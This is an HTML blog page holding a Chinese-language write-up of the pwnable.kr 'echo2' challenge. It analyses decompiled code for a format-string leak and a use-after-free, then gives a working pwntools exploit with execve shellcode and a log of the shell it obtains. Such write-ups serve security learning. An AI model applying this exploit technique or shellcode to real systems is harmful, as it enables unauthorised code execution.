@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。 分析先分析反编译代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl main(int argc, const char">
+<meta name="keywords" content="pwnable.kr,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-echo2">
+<meta property="og:url" content="http://yoursite.com/2018/03/10/pwnable.kr-echo2/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。 分析先分析反编译代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl main(int argc, const char">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:10:57.849Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-echo2">
+<meta name="twitter:description" content="前言这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。 分析先分析反编译代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl main(int argc, const char">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/10/pwnable.kr-echo2/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.kr-echo2 | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/10/pwnable.kr-echo2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.kr-echo2
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-03-10 10:41:00" itemprop="dateCreated datePublished" datetime="2018-03-10T10:41:00+08:00">2018-03-10</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:10:57" itemprop="dateModified" datetime="2018-08-04T15:10:57+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  _QWORD v7[<span class="number">4</span>]; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  o = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  *((_QWORD *)o + <span class="number">3</span>) = greetings;</span><br><span class="line">  *((_QWORD *)o + <span class="number">4</span>) = byebye;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hey, what's your name? : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">int</span> *)v7;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%24s"</span>, v7);</span><br><span class="line">  v4 = o;</span><br><span class="line">  *(_QWORD *)o = v7[<span class="number">0</span>];</span><br><span class="line">  v4[<span class="number">1</span>] = v7[<span class="number">1</span>];</span><br><span class="line">  v4[<span class="number">2</span>] = v7[<span class="number">2</span>];</span><br><span class="line">  id = v7[<span class="number">0</span>];</span><br><span class="line">  getchar();</span><br><span class="line">  func[<span class="number">0</span>] = (__int64)echo1;</span><br><span class="line">  qword_602088 = (__int64)echo2;</span><br><span class="line">  qword_602090 = (__int64)echo3;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"\n- select echo type -"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 1. : BOF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 2. : FSB echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 3. : UAF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 4. : exit"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">        v3 = &amp;v6;</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> *))func[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 - <span class="number">1</span>)])(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid menu"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure you want to exit? (y/n)"</span>, &amp;v6);</span><br><span class="line">    v6 = getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">121</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"bye"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">echo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">3</span>))(o);</span><br><span class="line">  get_input(&amp;format, <span class="number">32L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">4</span>))(o);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">echo3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// ST08_8@1</span></span><br><span class="line"></span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">3</span>))(o);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  get_input(s, <span class="number">32L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD, _QWORD))o + <span class="number">4</span>))(o, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序这次只实现了<code>echo2</code>和<code>echo3</code>函数。分析可以发现，<code>echo2</code>函数中有格式化字符串漏洞。利用这个漏洞可以读写任意8字节内存。开始想得利用方式是向<code>v7</code>变量（就是要输入的名字）写shellcode然后通过该漏洞改写返回地址跳转到该处执行，但是实际上栈地址是64位的想一次写入64位的整数到内存用时太长，特别是在题目平台更长。所以这种方法并不可取。<br>另一处漏洞需要<code>echo3</code>函数配合<code>main</code>函数里的一处逻辑缺陷来制造<code>uaf漏洞</code>。仔细分析<code>main</code>函数发现，如果在选择<code>4</code>选项退出时，程序会执行<code>cleanup</code>函数，该函数会执行<code>free(o)</code>释放掉先前申请的<code>0x28</code>大小的堆空间。接下来程序又会询问是否退出，否的话又会进入主逻辑执行。很明显的一处释放后重用。而<code>echo3</code>函数中申请了<code>0x20</code>大小的堆空间，根据glibc的堆管理策略，这次申请的堆会直接使用上次释放的堆块，这样如果覆盖了第4个8字节就会导致后面执行<code>(*((void (__fastcall **)(_QWORD))o + 3))(o);</code>时执行任意覆盖的地址了。利用这个漏洞就能解决<code>printf</code>写内存的困难。<br>整理下利用思路，向<code>v7</code>变量覆盖shellcode，使用<code>prinf</code>的漏洞leak处栈地址然后计算处<code>v7</code>的地址，之后利用uaf漏洞跳转到<code>v7</code>执行。下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./echo2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9011</span>)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span><span class="comment"># 23 bytes</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#context.terminal=['gnome-terminal','-x','sh','-c']</span></span><br><span class="line">    <span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">' : '</span>)</span><br><span class="line">    r.sendline(shellcode)</span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'%10$016lx'</span>) <span class="comment"># get rbp addr</span></span><br><span class="line">    </span><br><span class="line">    rbp_addr = int(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">    v7_addr = rbp_addr<span class="number">-0x20</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'(y/n)'</span>)</span><br><span class="line">    r.sendline(<span class="string">'n\n3\n'</span>+<span class="string">'a'</span>*<span class="number">24</span>+p64(v7_addr))</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9011: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">hello </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaa0\x1f\xb4&gt;\xfe\x7f</span><br><span class="line">goodbye </span><br><span class="line"></span><br><span class="line">- select <span class="built_in">echo</span> <span class="built_in">type</span> -</span><br><span class="line">- 1. : BOF <span class="built_in">echo</span></span><br><span class="line">- 2. : FSB <span class="built_in">echo</span></span><br><span class="line">- 3. : UAF <span class="built_in">echo</span></span><br><span class="line">- 4. : <span class="built_in">exit</span></span><br><span class="line">&gt; sh: 1: 3: not found</span><br><span class="line">$ ls</span><br><span class="line">echo2</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">fun_with_UAF_and_FSB :)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<p>另外注意这是linux的x64环境下，<code>printf</code>的利用需要考虑前6个参数是寄存器传递的，要计算好。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>两个漏洞的配合最后拿下shell，很爽。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/06/pwnable.kr-echo1/" rel="next" title="pwnable.kr-echo1">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-echo1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/14/pwnable.kr-rsa_calculator/" rel="prev" title="pwnable.kr-rsa_calculator">
+                pwnable.kr-rsa_calculator <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
